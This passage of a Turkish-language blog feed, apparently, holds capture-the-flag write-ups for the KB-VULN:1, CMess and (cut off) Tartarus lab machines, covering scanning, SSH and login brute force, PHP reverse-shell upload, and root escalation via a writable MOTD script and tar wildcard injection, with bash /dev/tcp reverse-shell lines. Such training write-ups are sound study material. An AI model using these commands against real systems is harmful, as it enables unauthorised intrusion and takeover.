1. KeÅŸif AÅŸamasÄ± Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.  netdiscover -i eth0  Ip adresi tespit edildikten sonra nmap ile makinenin aÃ§Ä±k portlarÄ± ve portlarda Ã§alÄ±ÅŸan servisleri tespit edilir.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazÄ±mda sizlere <a href="https://www.vulnhub.com/entry/kb-vuln-1,540/">VULNHUB</a> &lsquo;da yer alan medium seviye KB-VULN: 1 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&hellip;</p>
<h2 id="1-keÅŸif-aÅŸamasÄ±">1. KeÅŸif AÅŸamasÄ±</h2>


<div style="text-align:justify;">
Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.
</div>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth0
</code></pre></div>
    <img src="/images/vulnhub/kb-vuln1/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Ip adresi tespit edildikten sonra nmap ile makinenin aÃ§Ä±k portlarÄ± ve portlarda Ã§alÄ±ÅŸan servisleri tespit edilir.</p>
<p>
    <img src="/images/vulnhub/kb-vuln1/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
Ftp portunda Ã§alÄ±ÅŸan servisin konfigÃ¼rasyon ayarlarÄ± varsayÄ±lan olarak bÄ±rakÄ±ldÄ±ÄŸÄ± iÃ§in anonymous eriÅŸim aÃ§Ä±ktÄ±r. Ftp servisine baÄŸlanÄ±lÄ±r ve paylaÅŸÄ±ma aÃ§Ä±k dosyalar incelenir.
</div>

    <img src="/images/vulnhub/kb-vuln1/ftp1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />

</p>
<p><strong>.bash_history</strong> adlÄ± dosya bilgisayara indirilir.</p>
<p>
    <img src="/images/vulnhub/kb-vuln1/ftp2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
Ä°ndirilen dosyanÄ±n iÃ§eriÄŸine bakÄ±ldÄ±ÄŸÄ±ndan ssh vb. eriÅŸimlerde kullanÄ±cÄ±ya verilen karÅŸÄ±lama mesajÄ±nÄ±n (GÃ¼nÃ¼n MesajÄ±-Message Of The Day(motd)) yer aldÄ±ÄŸÄ± <i style="color:yellow"> <strong> 00-header </strong></i> dosyasÄ±nda deÄŸiÅŸiklik yapÄ±ldÄ±ÄŸÄ± gÃ¶rÃ¼lmektedir. Yetki yÃ¼kseltme aÅŸamasÄ±nda kullanÄ±labilir.
<br>
</div>

    <img src="/images/vulnhub/kb-vuln1/file.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />

</p>
<p>TarayÄ±cÄ± ile web servisine istek atÄ±lÄ±r. Oneschool adlÄ± bir web sayfasÄ± aÃ§Ä±lmaktadÄ±r. Sayfa kaynak kodlarÄ± incelendiÄŸinde bir kullanÄ±cÄ± adÄ± tespit edilmektedir.</p>
<p>
    <img src="/images/vulnhub/kb-vuln1/website.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
<br>
</div>

    <img src="/images/vulnhub/kb-vuln1/websource.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
Web dizininde gobuser ile dizin taramasÄ± gerÃ§ekleÅŸtirilir. YapÄ±lan dizin ve alt dizin taramalarÄ±nda ilk eriÅŸim iÃ§in parola yada giriÅŸ paneli tespit edilememiÅŸtir. Elde edilen kullanÄ±cÄ± adÄ± ile hydra aracÄ± ile ssh servisine brute force saldÄ±rÄ± yapÄ±lÄ±r.
</div></p>
<pre><code class="language-terminal" data-lang="terminal">hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102
</code></pre>
    <img src="/images/vulnhub/kb-vuln1/hydra.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-eriÅŸim-saÄŸlanmasÄ±">2. EriÅŸim SaÄŸlanmasÄ±</h2>
<p>Elde edilen parola ile ssh eriÅŸimi saÄŸlanÄ±r.</p>
<pre><code class="language-terminal" data-lang="terminal">[barcode@parrot]â”€[~]$ ssh sysadmin@192.168.56.102
The authenticity of host '192.168.56.102 (192.168.56.102)' can't be established.
ECDSA key fingerprint is SHA256:9z5jY109u48eo71sMGnTp9s13QY0KGVMI9B/m2mkCZs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.102' (ECDSA) to the list of known hosts.
sysadmin@192.168.56.102's password: 

			WELCOME TO THE KB-SERVER

Last login: Sat Aug 22 18:00:48 2020
To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
See &quot;man sudo_root&quot; for details.

sysadmin@kb-server:~$
</code></pre><p>sysadmin kullanÄ±cÄ±sÄ±na ait home dizininde yer alan dosyalar listelenir ve user.txt dosyasÄ± okunarak ilk flag elde edilir.</p>

    <img src="/images/vulnhub/kb-vuln1/userflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yÃ¼kseltme">3. Yetki YÃ¼kseltme</h2>
<p>Ä°lk olarak <em><strong>/etc/update-motd.d/</strong></em> dizinine gidilir ve 00-header dosyasÄ±nÄ±n izinleri kontrol edilir.</p>
<pre><code class="language-terminal" data-lang="terminal">sysadmin@kb-server:~$ cd /etc/update-motd.d/
sysadmin@kb-server:/etc/update-motd.d$ ls -lsa
total 16
4 drwxr-xr-x  3 root root 4096 Aug 22 17:08 .
4 drwxr-xr-x 92 root root 4096 Sep 11 08:24 ..
4 -rwxrwxrwx  1 root root  989 Aug 22 17:08 00-header
4 drwxr-xr-x  2 root root 4096 Aug 22 17:07 other
</code></pre><p>00-header dosyasÄ±nda tÃ¼m kullanÄ±cÄ±lara yazma yetkisi verildiÄŸi gÃ¶rÃ¼lmektedir. Normal kullanÄ±mda bu yetki sadece root yetkisinde olmaktadÄ±r. Dosya iÃ§eriÄŸi gÃ¶rÃ¼ntÃ¼lenir.</p>

    <img src="/images/vulnhub/kb-vuln1/header1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Ssh eriÅŸiminde Ã§alÄ±ÅŸan dosyanÄ±n hangi kullanÄ±cÄ± yetkisi ile Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nÄ±n tespiti iÃ§in whoami komutu eklenir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;whoami&#34;</span> &gt;&gt; 00-header
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sysadmin@kb-server:/etc/update-motd.d$ cat 00-header 
<span style="color:#75715e">#!/bin/sh</span>
#
<span style="color:#75715e">#    00-header - create the header of the MOTD</span>
<span style="color:#75715e">#    Copyright (C) 2009-2010 Canonical Ltd.</span>
#
<span style="color:#75715e">#    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;</span>
#
<span style="color:#75715e">#    This program is free software; you can redistribute it and/or modify</span>
<span style="color:#75715e">#    it under the terms of the GNU General Public License as published by</span>
<span style="color:#75715e">#    the Free Software Foundation; either version 2 of the License, or</span>
<span style="color:#75715e">#    (at your option) any later version.</span>
#
<span style="color:#75715e">#    This program is distributed in the hope that it will be useful,</span>
<span style="color:#75715e">#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span style="color:#75715e">#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span style="color:#75715e">#    GNU General Public License for more details.</span>
#
<span style="color:#75715e">#    You should have received a copy of the GNU General Public License along</span>
<span style="color:#75715e">#    with this program; if not, write to the Free Software Foundation, Inc.,</span>
<span style="color:#75715e">#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>

<span style="color:#f92672">[</span> -r /etc/lsb-release <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> . /etc/lsb-release

echo <span style="color:#e6db74">&#34;\n\t\t\tWELCOME TO THE KB-SERVER\n&#34;</span>
whoami
</code></pre></div><p>Ssh baÄŸlantÄ±sÄ± kesilip tekrardan eriÅŸim saÄŸlandÄ±ÄŸÄ±nda 00-header dosyasÄ± iÃ§erisinde Ã§alÄ±ÅŸtÄ±rÄ±lan dosyalarÄ±n root yetkisi ile Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ± gÃ¶rÃ¼lmektedir.</p>
<pre><code class="language-terminal" data-lang="terminal">sysadmin@192.168.56.102's password: 

			WELCOME TO THE KB-SERVER

root &lt;--- Eklenen komut Ã‡Ä±ktÄ±sÄ±
Last login: Thu Sep 17 19:06:26 2020 from 192.168.56.1
To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
See &quot;man sudo_root&quot; for details.
</code></pre><p>YÃ¼ksek yetki ile shell baÄŸlantÄ±sÄ± saÄŸlamak iÃ§in 00-header dosyasÄ±na aÅŸaÄŸÄ±da yer alan komut eklenir ve tekrar eriÅŸim saÄŸlanÄ±ldÄ±ÄŸÄ±nda 4444 numaralÄ± porta shell baÄŸlantÄ±sÄ± dÃ¼ÅŸmektedir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.56.101/4444 &lt;&amp;1&#39;&#34;</span> &gt;&gt; 00-header 
</code></pre></div>
    <img src="/images/vulnhub/kb-vuln1/header2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
<br>
</div>

    <img src="/images/vulnhub/kb-vuln1/root.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
<br>
Root dizinine gidilir ve flag.txt dosyasÄ± okunarak makina Ã§Ã¶zÃ¼mlemesi tamamlanÄ±r.

</div>

    <img src="/images/vulnhub/kb-vuln1/rootflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>THM CMess Write Up</title>
            <link>https://barcode91.github.io/posts/2020/09/thm-cmess-write-up/</link>
            <pubDate>Tue, 15 Sep 2020 20:03:12 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/09/thm-cmess-write-up/</guid>
            <description>Merhaba, bu yazÄ±mda TryHackMe platformunda yer alan, orta seviye zorlukta olan CMess adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeÄŸim. HatalÄ± yada ilave aÃ§Ä±klama gerektiren yerler iÃ§in yorum bÄ±rakabilirsiniz. Keyifli okumalar...  1. KeÅŸif AÅŸamasÄ± Nmap ile makinenin aÃ§Ä±k portlarÄ± ve portlarda Ã§alÄ±ÅŸan servisleri tespit edilir.
sudo nmap -sV -sC 10.10.190.58   cmess.thm  alan adÄ±  /etc/hosts  dosyasÄ±na dns Ã§Ã¶zÃ¼mlemesi iÃ§in eklenmesi, makina tasarÄ±mcÄ± tarafÄ±ndan istenmektedir.  sudo nano /etc/hosts -------------------- ##Ekleme 10.</description>
            <content type="html"><![CDATA[

<div style="text-align:justify;">
Merhaba, bu yazÄ±mda TryHackMe platformunda yer alan, orta seviye zorlukta olan CMess adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeÄŸim. HatalÄ± yada ilave aÃ§Ä±klama gerektiren yerler iÃ§in yorum bÄ±rakabilirsiniz. Keyifli okumalar...
</div>
<h2 id="1-keÅŸif-aÅŸamasÄ±">1. KeÅŸif AÅŸamasÄ±</h2>
<p>Nmap ile makinenin aÃ§Ä±k portlarÄ± ve portlarda Ã§alÄ±ÅŸan servisleri tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC 10.10.190.58 
</code></pre></div>
    <img src="/images/thm/cmess/nmap.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
<br>
<i style="color:yellow"><b> cmess.thm </b></i> alan adÄ± <i style="color:yellow"><b> /etc/hosts </b></i> dosyasÄ±na dns Ã§Ã¶zÃ¼mlemesi iÃ§in eklenmesi, makina tasarÄ±mcÄ± tarafÄ±ndan istenmektedir. 
</div>
<pre><code class="language-terminal" data-lang="terminal">    sudo nano /etc/hosts
    --------------------
    ##Ekleme
    10.10.173.46    cmess.thm
</code></pre><p>

<div style="text-align:justify;">
TarayÄ±cÄ± ile web servisine istek atÄ±lÄ±r. Ä°Ã§erik yÃ¶netim yazÄ±lÄ±mlarÄ±ndan olan Gila CMS web sayfasÄ± aÃ§Ä±lmaktadÄ±r.
</div>

    <img src="/images/thm/cmess/website.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />

</p>
<p>Web dizininde yer alan dosyalar ve klasÃ¶rlerin tespiti iÃ§in gobuster kullanÄ±lÄ±r.</p>
<pre><code class="language-terminal" data-lang="terminal">gobuster dir -u http://10.10.190.58 -w /usr/share/wordlists/dirb/common.txt 
</code></pre><pre><code>===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.190.58
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/05 09:53:31 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/0 (Status: 200)
/01 (Status: 200)
/1 (Status: 200)
/1x1 (Status: 200)
/about (Status: 200)
/About (Status: 200)
/admin (Status: 200)
/api (Status: 200)
/assets (Status: 301)
/author (Status: 200)
/blog (Status: 200)
/category (Status: 200)
/feed (Status: 200)
/fm (Status: 200)
/Index (Status: 200)
/index (Status: 200)
/lib (Status: 301)
/log (Status: 301)
/login (Status: 200)
/robots.txt (Status: 200)
/search (Status: 200)
/Search (Status: 200)
/server-status (Status: 403)
/sites (Status: 301)
/src (Status: 301)
/tag (Status: 200)
/tags (Status: 200)
/themes (Status: 301)
/tmp (Status: 301)
===============================================================
2020/09/05 09:54:20 Finished
===============================================================

</code></pre>

<div style="text-align:justify;">
Nmap ve gobuster taramalarÄ±nda robots.txt dosyasÄ± iÃ§erisinde <i style="color:yellow"> /src, /themes, /lib </i> dizin girdileri yer almaktadÄ±r. AyrÄ±ca /login dizinine girildiÄŸinde giriÅŸ paneli gÃ¶rÃ¼lmektedir.
</div>
<p>
    <img src="/images/thm/cmess/login.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
Web dizininde yapÄ±lan alt dizin taramalarÄ±nda herhangi bir kullanÄ±cÄ± adÄ± ve parola bilgileri tespit edilememiÅŸtir. Wfuzz aracÄ± ile subdomain taramasÄ± yapÄ±larak alt alan adlarÄ± tespit edilmeye Ã§alÄ±ÅŸÄ±lÄ±r.Wordlist olarak SecLists listeler topluluÄŸu iÃ§erisinde yeralan en Ã§ok kullanÄ±lan dns listesi kullanÄ±lÄ±r.
</div></p>
<p><strong>SecList Kurulumu</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">##Zip Olarak Kurulumu</span>
wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>  <span style="color:#f92672">&amp;&amp;</span> unzip SecList.zip <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>  <span style="color:#f92672">&amp;&amp;</span> rm -f SecList.zip

<span style="color:#75715e">##Git Ä°le Kurulumu</span>
git clone https://github.com/danielmiessler/SecLists.git
</code></pre></div><pre><code>wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &quot;http://cmess.thm&quot;  -H &quot;Host: FUZZ.cmess.thm&quot; --hw 290
</code></pre><p>
    <img src="/images/thm/cmess/wfuzz.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">


Tespit edilen subdomain Ã¶nce <i style="color:yellow"> /etc/hosts </i> dosyasÄ±na subdomain.cmess.thm ÅŸekilde olacak ÅŸekilde eklenir ve adrese gidilir. Ä°Ã§erisinde bir kullanÄ±cÄ±nÄ±n destek ekibi ile yaptÄ±ÄŸÄ± kullanÄ±cÄ± parola sÄ±fÄ±rlama iÅŸlemine ait yazÄ±ÅŸmalar yer almaktadÄ±r. 
</div></p>
<p>
    <img src="/images/thm/cmess/passrecovery.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
KullanÄ±cÄ±ya ait giriÅŸ bilgileri ile login panelinden giriÅŸ yapÄ±lÄ±r. CMS yÃ¶netim paneli aÃ§Ä±lmaktadÄ±r.
</div></p>

    <img src="/images/thm/cmess/webadmin.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Web panelinden shell almak iÃ§in soldaki  <strong>Content -&gt; File Manager -&gt; File Upload</strong>  sekmesi takip edilerek <a href="https://github.com/pentestmonkey/php-reverse-shell">reverse shell</a> kodlarÄ±nÄ±n yer aldÄ±ÄŸÄ± php sayfasÄ± upload edilir. Upload edilen dosya <strong>src/assets</strong> klasÃ¶rÃ¼ altÄ±nda yer almaktadÄ±r.</p>

    <img src="/images/thm/cmess/upload.png"  alt="Barcode"  class="center"  style="border-radius: 8px;"  />


<h2 id="2-eriÅŸim-saÄŸlanmasÄ±">2. EriÅŸim SaÄŸlanmasÄ±</h2>
<pre><code class="language-terminal" data-lang="terminal">nc -lvp 4444
</code></pre>

<div style="text-align:justify;">
Upload ettiÄŸimiz reverse shell dosyasÄ±nda ayarlanan port dinlenmeye baÅŸlanÄ±r. TarayÄ±cÄ± Ã¼zerinde reverse.php dosyasÄ± Ã§aÄŸÄ±rÄ±lÄ±r ve shell baÄŸlantÄ±sÄ± gerÃ§ekleÅŸtirilir.
<br><br>
</div>

    <img src="/images/thm/cmess/nc.png"  alt="Barcode"  class="center"  style="border-radius: 8px;"  />


<p><strong>www-data</strong> kullanÄ±cÄ±sÄ± ile sisteme eriÅŸim saÄŸladÄ±ÄŸÄ±ndan yetki yÃ¼kseltmek iÃ§in <a href="https://github.com/rebootuser/LinEnum">LinEnum betiÄŸi</a> Ã§alÄ±ÅŸtÄ±rlarak bilgi toplanÄ±r. Elde edilen bilgilerde <strong><em>/opt</em></strong> dizini altÄ±nda gizli bir password yedek dosyasÄ± gÃ¶rÃ¼lmektedir. Ä°Ã§eriÄŸine bakÄ±ldÄ±ÄŸÄ±nda <em>andres</em> kullanÄ±sÄ±na ait oturum parolasÄ± elde edilir.</p>

    <img src="/images/thm/cmess/userpass.png"  alt="Barcode"  class="center"  style="border-radius: 8px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> su andres 
</code></pre></div><p>komutu ile andres kullanÄ±cÄ±sÄ± ile oturum aÃ§Ä±lÄ±r. Daha sonra /home/andres dizininde yer alan user.txt dosyasÄ± okunur.</p>

    <img src="/images/thm/cmess/userflag.png"  alt="Barcode"  class="center"  style="border-radius: 8px;"  />


<h2 id="3-yetki-yÃ¼kseltme">3. Yetki YÃ¼kseltme</h2>
<p>Yetki yÃ¼kseltme aÅŸamasÄ±nda zamanlanmÄ±ÅŸ gÃ¶revler, suid ve sgid biti aktif dosyalar, alÄ±nmÄ±ÅŸ yedekler ve zayÄ±f dosya yetkileri vb. kontrol edilir. Testlerde yaygÄ±n olarak sistem hakkÄ±nda bilgiler <a href="https://github.com/rebootuser/LinEnum">LinEnum betiÄŸi</a> kullanÄ±larak elde edilir. Crontab iÃ§eriÄŸinde tar uygulamasÄ± ile zamanlamÄ±ÅŸ yedekleme iÅŸlemi dikkat Ã§ekmektedir. Backup klasÃ¶rÃ¼ndeki herÅŸey /tmp klasÃ¶rÃ¼ altÄ±na yedeklenmektedir.</p>

    <img src="/images/thm/cmess/crontab.png"  alt="Barcode"  class="center"  style="border-radius: 8px;"  />


<p>Tar uygulamasÄ±nda wilcard injection metodu ile yetki yÃ¼kseltilebilmektedir. Linux sistemlerde joker karakter (wildcard) olarak kullanÄ±lan Ã§eÅŸitli karakterler vardÄ±r. Bunlardan bazÄ±larÄ± <code>{* , ?, [], -, ~ }</code> .
Bunlar iÅŸlem yapÄ±lmadan Ã¶nce kabuk tarafÄ±ndan yorumlanÄ±r. Tar ile uygulamasÄ±na bakacak olursak,yedeklenecek klasÃ¶r iÃ§erisinde 3 adet dosya oluÅŸturulur.</p>
<ol>
<li>Ã‡alÄ±ÅŸtÄ±rÄ±lacak kabuk dosyasÄ±</li>
<li>Tar uygulamasÄ±nÄ±n parametre olarak alacaÄŸÄ± 2 adet dosya</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.8.97.33/6666 &lt;&amp;1&#39;&#34;</span> &gt; shell.sh
echo <span style="color:#e6db74">&#34;&#34;</span> &gt; <span style="color:#e6db74">&#34;--checkpoint-action=exec=sh shell.sh&#34;</span>
echo <span style="color:#e6db74">&#34;&#34;</span> &gt; --checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</code></pre></div><p>Backup klasÃ¶r iÃ§eriÄŸine bakÄ±ldÄ±ÄŸÄ±nda oluÅŸturulan dosyalar gÃ¶rÃ¼lmektedir.</p>

    <img src="/images/thm/cmess/tarwilcard.png"  alt="Barcode"  class="center"  style="border-radius: 8px;"  />


<p>Tar uygulamasÄ± Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda - - ile baÅŸlayan dosyalarÄ± parametre olarak alacak ve shell.sh dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±racaktÄ±r. Shell dosyasÄ±nda ayarlanan port dinlemeye alÄ±nÄ±r ve yedekleme Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda root yetkisi ile oturum elde edilir.</p>
<pre><code class="language-terminal" data-lang="terminal">â”€[barcode@parrot]â”€[~]$ nc -lvp 6666
listening on [any] 6666 ...
connect to [10.8.97.33] from cmess.thm [10.10.173.46] 46366
bash: cannot set terminal process group (990): Inappropriate ioctl for device
bash: no job control in this shell
root@cmess:/home/andre/backup# cd
root@cmess:~# ls
root.txt
root@cmess:~# cat root.txt
**************************
root@cmess:~# 
</code></pre>]]></content>
        </item>
        
        <item>
            <title>THM Tartarus Write Up</title>
            <link>https://barcode91.github.io/posts/2020/09/thm-tartarus-write-up/</link>
            <pubDate>Sat, 12 Sep 2020 20:53:26 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/09/thm-tartarus-write-up/</guid>
            <description>Merhaba, Siber gÃ¼venliÄŸe yeni baÅŸlayanlarÄ±n ofansif yeteneklerini geliÅŸtirebileceÄŸi TryHackMe platformunda yer alan, baÅŸlangÄ±Ã§ seviyesi olan Tartarus adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeÄŸim. HatalÄ± yada ilave aÃ§Ä±klama gerektiren yerler iÃ§in yorum bÄ±rakabilirsiniz. Keyifli okumalar...  1. KeÅŸif AÅŸamasÄ± Nmap ile makinenin aÃ§Ä±k portlarÄ± ve portlarda Ã§alÄ±ÅŸan servisleri tespit edilir.
sudo nmap -sV -sC 10.10.236.165  TarayÄ±cÄ± ile web servisine istek atÄ±lÄ±r. Apache yazÄ±lÄ±mÄ±na ait varsayÄ±lan web sayfasÄ± aÃ§Ä±lmaktadÄ±r.
Web dizininde yer alan dosyalar ve klasÃ¶rlerin tespiti iÃ§in gobuster kullanÄ±lÄ±r.</description>
            <content type="html"><![CDATA[

<div style="text-align:justify;">
Merhaba, Siber gÃ¼venliÄŸe yeni baÅŸlayanlarÄ±n ofansif yeteneklerini geliÅŸtirebileceÄŸi TryHackMe platformunda yer alan, baÅŸlangÄ±Ã§ seviyesi olan Tartarus adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeÄŸim. HatalÄ± yada ilave aÃ§Ä±klama gerektiren yerler iÃ§in yorum bÄ±rakabilirsiniz. Keyifli okumalar...
</div>
<h2 id="1-keÅŸif-aÅŸamasÄ±">1. KeÅŸif AÅŸamasÄ±</h2>
<p>Nmap ile makinenin aÃ§Ä±k portlarÄ± ve portlarda Ã§alÄ±ÅŸan servisleri tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC 10.10.236.165 
</code></pre></div>
    <img src="/images/thm/tartarus/nmap.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>TarayÄ±cÄ± ile web servisine istek atÄ±lÄ±r. Apache yazÄ±lÄ±mÄ±na ait varsayÄ±lan web sayfasÄ± aÃ§Ä±lmaktadÄ±r.</p>

    <img src="/images/thm/tartarus/webpage.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Web dizininde yer alan dosyalar ve klasÃ¶rlerin tespiti iÃ§in gobuster kullanÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.236.165 -w /usr/share/wordlists/dirb/common.txt 
</code></pre></div>
    <img src="/images/thm/tartarus/gobuster.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
Gobuster sonucunda robots.txt dosyasÄ± dikkat Ã§ekmektedir. Robots.txt, arama motoru Ã¶rÃ¼mcekleri sitenizin hangi bÃ¶lÃ¼mlerini dizine ekleyebileceÄŸini, hangi dizini taramasÄ± gerektiÄŸini, hangi arama motoru yazÄ±lÄ±mÄ±nÄ±n giriÅŸ izni olduÄŸunu veya olmadÄ±ÄŸÄ±nÄ± sÃ¶ylemeye yarayan basit bir komut dosyasÄ±dÄ±r. Dosya iÃ§eriÄŸi okunur.
</div>

    <img src="/images/thm/tartarus/robots.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>

<div style="text-align:justify;">
Arama motorlarÄ± tarafÄ±ndan indexlenmesi engellenen <i>/admin-dir</i> dizine giriÅŸ yapÄ±lÄ±r. Dizinde muhtemel kullanÄ±cÄ± adÄ± ve parola listeleri yer almaktadÄ±r. Listeler indirilir.  Ftp servisinde anonim olarak eriÅŸime aÃ§Ä±k olan test.txt dosyasÄ± incelenir.
</div>

    <img src="/images/thm/tartarus/cat.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />

</p>
<p>ftp dizininde dolaÅŸÄ±larak araÅŸtÄ±rmaya devam edilir. <strong>{&hellip;}</strong> dizini dikkat Ã§ekmektedir. Dizin iÃ§erisindeki <strong><em>yougotgoodeyes.txt</em></strong> isimli dosya indirilir ve iÃ§eriÄŸi okunur.</p>

    <img src="/images/thm/tartarus/ftpd.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Ä°Ã§erisinde bir dizin adÄ± yer almaktadÄ±r.</p>
<p>
    <img src="/images/thm/tartarus/secretdir.png"  alt="Hello Friend"  class="left"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
TarayÄ±dan giriÅŸ yapÄ±ldÄ±ÄŸÄ±nda bir login ekranÄ± Ã§Ä±kmaktadÄ±r. Elde edilen bilgiler ile burpsuite aracÄ± kullanÄ±larak kaba kuvvet saldÄ±rÄ±sÄ± yapÄ±lÄ±r. 

iki adet parametre ve iki ayrÄ± liste olduÄŸundan intruder -> Payload Options -> Cluster Bomb seÃ§ilerek kaba kuvvet saldÄ±rÄ±sÄ± iÃ§in ayarlamalar yapÄ±lÄ±r. AyrÄ±ntÄ±lÄ± bilgi iÃ§in aÅŸaÄŸÄ±daki linke bakÄ±labilir.
</div>
<strong><em><a href="https://portswigger.net/support/using-burp-to-brute-force-a-login-page">https://portswigger.net/support/using-burp-to-brute-force-a-login-page</a></em></strong></p>
<p>Username ve Password parametleri iÅŸaretlenir.</p>

    <img src="/images/thm/tartarus/burp1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


